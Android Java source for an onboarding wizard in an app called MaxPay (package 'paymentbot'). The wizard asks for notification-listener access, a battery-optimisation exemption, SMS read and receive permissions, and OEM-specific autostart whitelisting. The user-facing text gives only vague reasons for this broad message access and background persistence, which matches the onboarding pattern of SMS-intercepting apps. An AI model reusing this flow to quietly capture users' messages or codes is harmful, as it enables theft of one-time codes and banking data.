package com.example.paymentbot;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.List;

public class PermissionActivity extends Activity {

  // Approved MaxPay brand — primary emerald / soft emerald / white.
  private static final int BRAND_PRIMARY = 0xFF0F6B5C;
  private static final int BRAND_SOFT = 0xFFE8F5F1;
  private static final int DOT_INACTIVE = 0xFFE0E0E0;

  // Page 4 (auto-start) only appears on OEMs detectOem() matches, so the
  // total step count is dynamic (3 on stock Android, 4 on a matched OEM) —
  // computed once per showPage() call from detectOem() rather than hardcoded.
  private int currentPage = 1;
  private final List<View> dots = new ArrayList<>();

  @Override
  protected void onCreate(Bundle saved) {
    super.onCreate(saved);
    showPage(1);
  }

  private int totalPages() {
    return detectOem() != null ? 4 : 3;
  }

  private void showPage(int page) {
    currentPage = page;
    LinearLayout root = buildRoot();

    switch (page) {
      case 1: buildNotificationPage(root); break;
      case 2: buildBatteryPage(root); break;
      case 3: buildSmsPage(root); break;
      case 4: buildAutoStartPage(root); break;
    }

    setContentView(root);
  }

  private LinearLayout buildRoot() {
    LinearLayout root = new LinearLayout(this);
    root.setOrientation(LinearLayout.VERTICAL);
    root.setBackgroundColor(Color.WHITE);
    root.setLayoutParams(new ViewGroup
      .LayoutParams(-1, -1));

    // Top row: X close button + step-progress dots. Previously this wizard
    // had no progress indicator at all — a real, simple "how many steps are
    // left" signal, matching the dot pattern already built (and unused) in
    // OnboardingActivity.
    LinearLayout topRow = new LinearLayout(this);
    topRow.setOrientation(LinearLayout.HORIZONTAL);
    topRow.setGravity(Gravity.CENTER_VERTICAL);
    topRow.setPadding(dp(20), dp(40), dp(20), dp(20));
    topRow.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));

    TextView closeBtn = new TextView(this);
    closeBtn.setText("✕");
    closeBtn.setTextColor(0xFF333333);
    closeBtn.setTextSize(20);
    closeBtn.setOnClickListener(v -> finish());
    LinearLayout.LayoutParams closeLp = new LinearLayout.LayoutParams(-2, -2);
    topRow.addView(closeBtn, closeLp);

    topRow.addView(buildDots(), new LinearLayout.LayoutParams(0, -2, 1f));

    root.addView(topRow);
    return root;
  }

  private View buildDots() {
    LinearLayout dotRow = new LinearLayout(this);
    dotRow.setOrientation(LinearLayout.HORIZONTAL);
    dotRow.setGravity(Gravity.CENTER);
    dots.clear();
    int total = totalPages();
    for (int i = 0; i < total; i++) {
      View dot = new View(this);
      LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(dp(7), dp(7));
      lp.setMargins(dp(4), 0, dp(4), 0);
      dot.setLayoutParams(lp);
      dot.setBackground(circle(i == currentPage - 1 ? BRAND_PRIMARY : DOT_INACTIVE));
      dots.add(dot);
      dotRow.addView(dot);
    }
    return dotRow;
  }

  private void buildNotificationPage(
    LinearLayout root
  ) {
    // Center content area
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("🔔");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    // Title
    TextView title = new TextView(this);
    title.setText("Notification access required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    // Description
    TextView desc = new TextView(this);
    desc.setText(
      "To handle incoming notifications,\n" +
      "please allow access to notifications."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    // Bottom button
    Button btn = buildBottomButton("Allow");
    btn.setOnClickListener(v -> {
      startActivity(new Intent(
        Settings
          .ACTION_NOTIFICATION_LISTENER_SETTINGS
      ));
    });
    root.addView(btn);
  }

  private void buildBatteryPage(
    LinearLayout root
  ) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("⚠️");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Battery optimization enabled");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "To prevent the system from stopping\n" +
      "the application in the background,\n" +
      "disable battery optimization for the app."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Disable");
    btn.setOnClickListener(v -> {
      Intent i = new Intent(
        Settings
          .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
      );
      i.setData(Uri.parse(
        "package:" + getPackageName()
      ));
      startActivity(i);
    });
    root.addView(btn);
  }

  private void buildSmsPage(LinearLayout root) {
    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("💬");
    icon.setTextSize(64);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(32);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Additional permissions required");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(16);
    content.addView(title, tp);

    TextView desc = new TextView(this);
    desc.setText(
      "Please provide the appropriate\n" +
      "permission for the proper handling\n" +
      "of incoming SMS messages."
    );
    desc.setTextColor(0xFF666666);
    desc.setTextSize(15);
    desc.setGravity(Gravity.CENTER);
    desc.setPadding(dp(32), 0, dp(32), 0);
    content.addView(desc);

    root.addView(content);

    Button btn = buildBottomButton("Grant");
    btn.setOnClickListener(v -> {
      ActivityCompat.requestPermissions(
        this,
        new String[]{
          android.Manifest.permission.RECEIVE_SMS,
          android.Manifest.permission.READ_SMS
        },
        100
      );
    });
    root.addView(btn);
  }

  @Override
  public void onRequestPermissionsResult(
    int requestCode,
    String[] permissions,
    int[] grantResults
  ) {
    super.onRequestPermissionsResult(
      requestCode, permissions, grantResults
    );
    if (requestCode == 100) {
      if (detectOem() != null) {
        // A known aggressive-background-kill OEM — guide through its
        // specific autostart/protected-app step before registration.
        // Distinct from every permission requested on the previous 3
        // pages, and not something Android's standard permission APIs
        // (battery-optimization exemption included) cover at all.
        showPage(4);
      } else {
        goToRegistration();
      }
    }
  }

  private void goToRegistration() {
    startActivity(new Intent(
      this, RegistrationActivity.class
    ));
    finish();
  }

  /**
   * Item 1 — per-manufacturer background-kill behavior, reference:
   * dontkillmyapp.com's documented settings paths per OEM. Every intent
   * below is a best-effort deep link into an undocumented OEM activity —
   * these component names are not a stable public API, change across
   * firmware versions, and dontkillmyapp.com itself documents them as
   * such. {@link #launchOemAutostartSettings} always tries the specific
   * intent first, then falls back to the app's own details page (which,
   * unlike the specific screens, is a real, stable Android API on every
   * device) if the specific one isn't present on this exact firmware.
   * NOT independently verified against real hardware for every entry here
   * — see the audit report for exactly which ones still need a real-device
   * confirmation pass per manufacturer.
   *
   * `steps` is a numbered instruction list (was a single newline-joined
   * String) — text-formatting only, same content, same detection/intent
   * logic untouched.
   */
  private enum Oem {
    // Xiaomi / Redmi / POCO (MIUI) — Security app's Autostart manager.
    XIAOMI("xiaomi|redmi|poco",
        new String[]{
            "MIUI stops background apps unless Autostart is turned on.",
            "Open Autostart settings below.",
            "Find MaxPay in the list.",
            "Turn Autostart ON."
        },
        "com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"),

    // Oppo / Realme (ColorOS) — the case already built and shipped tonight.
    COLOROS("oppo|realme",
        new String[]{
            "Realme/Oppo phones stop background apps unless Auto-start is turned on.",
            "Open App info below.",
            "Look for \"Auto-start\" (sometimes under Battery or App Management).",
            "Turn it ON."
        },
        null, null),

    // Vivo / iQOO — Permission Manager's background-startup whitelist.
    VIVO("vivo|iqoo",
        new String[]{
            "Vivo phones stop background apps unless added to the Autostart whitelist.",
            "Open Autostart settings below.",
            "Find MaxPay in the list.",
            "Turn it ON."
        },
        "com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"),

    // Huawei / Honor (EMUI) — Phone Manager's Protected/Startup apps list.
    HUAWEI("huawei|honor",
        new String[]{
            "Huawei/Honor phones stop background apps unless they're a Protected App.",
            "Open Startup Manager below.",
            "Find MaxPay.",
            "Enable \"Manage manually\" / Protected."
        },
        "com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"),

    // Samsung (One UI) — no stable component across versions; Samsung's
    // "Put unused apps to sleep" / battery background-usage limits are the
    // relevant setting, but the deep link into it changes often enough
    // between One UI releases that a direct app-details fallback is safer
    // as the PRIMARY path here rather than a secondary fallback.
    SAMSUNG("samsung",
        new String[]{
            "Samsung phones can put unused apps to sleep, stopping background monitoring.",
            "Open Battery settings below.",
            "Find MaxPay under \"Never sleeping apps\" or similar.",
            "Make sure it's excluded from sleep."
        },
        null, null),

    // OnePlus (OxygenOS) — older, pre-ColorOS-merge builds have their own
    // advanced-optimization battery chain manager. Newer OnePlus phones run
    // a ColorOS-based OxygenOS and may actually need the COLOROS case
    // instead — Build.MANUFACTURER doesn't distinguish this, so this is the
    // most likely of all six entries to need real-device correction.
    ONEPLUS("oneplus",
        new String[]{
            "OnePlus phones can restrict background apps under Battery Optimization.",
            "Open Battery settings below.",
            "Find MaxPay and set it to \"Don't optimize\".",
            "Disable \"Advanced Optimization\" for it."
        },
        "com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity");

    final String manufacturerPattern;
    final String[] steps;
    final String intentPackage;
    final String intentClass;

    Oem(String manufacturerPattern, String[] steps, String intentPackage, String intentClass) {
      this.manufacturerPattern = manufacturerPattern;
      this.steps = steps;
      this.intentPackage = intentPackage;
      this.intentClass = intentClass;
    }
  }

  /** Returns the matching OEM profile for this device, or null on stock/unknown Android. */
  private Oem detectOem() {
    String manufacturer = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.toLowerCase();
    for (Oem oem : Oem.values()) {
      for (String token : oem.manufacturerPattern.split("\\|")) {
        if (manufacturer.contains(token)) {
          return oem;
        }
      }
    }
    return null;
  }

  private void buildAutoStartPage(LinearLayout root) {
    Oem oem = detectOem();
    // Defensive only — this page is never shown unless detectOem() already
    // matched in onRequestPermissionsResult, but a fallback keeps this
    // method from crashing if that assumption is ever violated.
    if (oem == null) {
      goToRegistration();
      return;
    }

    LinearLayout content = new LinearLayout(this);
    content.setOrientation(LinearLayout.VERTICAL);
    content.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams cp =
      new LinearLayout.LayoutParams(-1, 0, 1f);
    content.setLayoutParams(cp);

    TextView icon = new TextView(this);
    icon.setText("🚀");
    icon.setTextSize(56);
    icon.setGravity(Gravity.CENTER);
    LinearLayout.LayoutParams ip =
      new LinearLayout.LayoutParams(-2, -2);
    ip.gravity = Gravity.CENTER;
    ip.bottomMargin = dp(24);
    content.addView(icon, ip);

    TextView title = new TextView(this);
    title.setText("Enable Auto-start");
    title.setTextColor(0xFF1A1A1A);
    title.setTextSize(20);
    title.setTypeface(null,
      android.graphics.Typeface.BOLD);
    title.setGravity(Gravity.CENTER);
    title.setPadding(dp(32), 0, dp(32), 0);
    LinearLayout.LayoutParams tp =
      new LinearLayout.LayoutParams(-1, -2);
    tp.bottomMargin = dp(20);
    content.addView(title, tp);

    // No manufacturer here has a single universal settings screen or intent
    // guaranteed stable across every firmware version — the numbered steps
    // below spell out the manual path as the source of truth (max 4 steps);
    // the button underneath is a best-effort shortcut into it, not a
    // guarantee.
    LinearLayout stepsList = new LinearLayout(this);
    stepsList.setOrientation(LinearLayout.VERTICAL);
    LinearLayout.LayoutParams stepsLp = new LinearLayout.LayoutParams(-1, -2);
    stepsLp.leftMargin = dp(32);
    stepsLp.rightMargin = dp(32);
    for (int i = 0; i < oem.steps.length; i++) {
      LinearLayout stepRow = new LinearLayout(this);
      stepRow.setOrientation(LinearLayout.HORIZONTAL);
      LinearLayout.LayoutParams stepRowLp = new LinearLayout.LayoutParams(-1, -2);
      stepRowLp.bottomMargin = dp(10);
      stepRow.setLayoutParams(stepRowLp);

      TextView number = new TextView(this);
      number.setText((i + 1) + ".");
      number.setTextColor(BRAND_PRIMARY);
      number.setTypeface(null, android.graphics.Typeface.BOLD);
      number.setTextSize(15);
      LinearLayout.LayoutParams numberLp = new LinearLayout.LayoutParams(-2, -2);
      numberLp.rightMargin = dp(8);
      stepRow.addView(number, numberLp);

      TextView stepText = new TextView(this);
      stepText.setText(oem.steps[i]);
      stepText.setTextColor(0xFF666666);
      stepText.setTextSize(15);
      stepRow.addView(stepText, new LinearLayout.LayoutParams(0, -2, 1f));

      stepsList.addView(stepRow);
    }
    content.addView(stepsList, stepsLp);

    root.addView(content);

    Button openSettingsBtn = buildSecondaryButton("Open " + (oem.intentClass != null ? "autostart settings" : "battery settings"));
    openSettingsBtn.setOnClickListener(v -> launchOemAutostartSettings(oem));
    root.addView(openSettingsBtn);

    // There is no OS API to verify any of these OEM-specific toggles' state
    // (that's exactly why no universal intent exists either), so — unlike
    // pages 1-3, which auto-advance in onResume() once the real permission
    // state flips — this step needs an explicit, manual confirmation to
    // move on.
    Button doneBtn = buildBottomButton("I've enabled it");
    doneBtn.setOnClickListener(v -> goToRegistration());
    root.addView(doneBtn);
  }

  /**
   * Tries the OEM's specific autostart-manager activity first (fastest path
   * when it exists on this exact firmware); falls back to the app's own
   * details page — a real, stable Android API on every device — if that
   * specific activity isn't present, throws a SecurityException (some OEMs
   * block launching these directly on newer firmware), or the OEM has no
   * known specific intent at all (Samsung, and ColorOS's own established
   * behavior from tonight's fix).
   */
  private void launchOemAutostartSettings(Oem oem) {
    if (oem.intentPackage != null && oem.intentClass != null) {
      try {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(oem.intentPackage, oem.intentClass));
        startActivity(intent);
        return;
      } catch (Exception e) {
        // Falls through to the app-details fallback below — expected on
        // firmware versions where this specific activity has moved/renamed.
      }
    }
    try {
      Intent intent = new Intent(
        Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
        Uri.parse("package:" + getPackageName())
      );
      startActivity(intent);
    } catch (Exception e) {
      // No-op — the "I've enabled it" button is still reachable even if
      // this device has no app-details screen at all.
    }
  }

  private Button buildSecondaryButton(String text) {
    Button btn = new Button(this);
    btn.setText(text);
    btn.setTextColor(BRAND_PRIMARY);
    btn.setTextSize(15);
    btn.setTypeface(null, android.graphics.Typeface.BOLD);
    btn.setAllCaps(false);
    btn.setBackgroundColor(Color.TRANSPARENT);

    LinearLayout.LayoutParams lp =
      new LinearLayout.LayoutParams(-1, dp(48));
    lp.setMargins(dp(24), 0, dp(24), 0);
    btn.setLayoutParams(lp);
    return btn;
  }

  @Override
  protected void onResume() {
    super.onResume();
    // Check if notification permission given
    // and advance pages
    if (currentPage == 1) {
      String flat = Settings.Secure.getString(
        getContentResolver(),
        "enabled_notification_listeners"
      );
      boolean notifEnabled = flat != null &&
        flat.contains(getPackageName());
      if (notifEnabled) showPage(2);
    } else if (currentPage == 2) {
      PowerManager pm = (PowerManager)
        getSystemService(POWER_SERVICE);
      if (pm.isIgnoringBatteryOptimizations(
          getPackageName())) {
        showPage(3);
      }
    }
  }

  private Button buildBottomButton(String text) {
    Button btn = new Button(this);
    btn.setText(text);
    btn.setTextColor(Color.WHITE);
    btn.setTextSize(16);
    btn.setTypeface(null,
      android.graphics.Typeface.BOLD);
    btn.setAllCaps(false);

    android.graphics.drawable.GradientDrawable bg =
      new android.graphics.drawable
        .GradientDrawable();
    bg.setColor(BRAND_PRIMARY);
    bg.setCornerRadius(dp(12));
    btn.setBackground(bg);

    LinearLayout.LayoutParams lp =
      new LinearLayout.LayoutParams(-1, dp(56));
    lp.setMargins(dp(24), dp(16),
      dp(24), dp(40));
    btn.setLayoutParams(lp);
    return btn;
  }

  private android.graphics.drawable.GradientDrawable circle(int color) {
    android.graphics.drawable.GradientDrawable d =
      new android.graphics.drawable.GradientDrawable();
    d.setShape(android.graphics.drawable.GradientDrawable.OVAL);
    d.setColor(color);
    return d;
  }

  private int dp(int dp) {
    return Math.round(dp *
      getResources().getDisplayMetrics().density);
  }
}
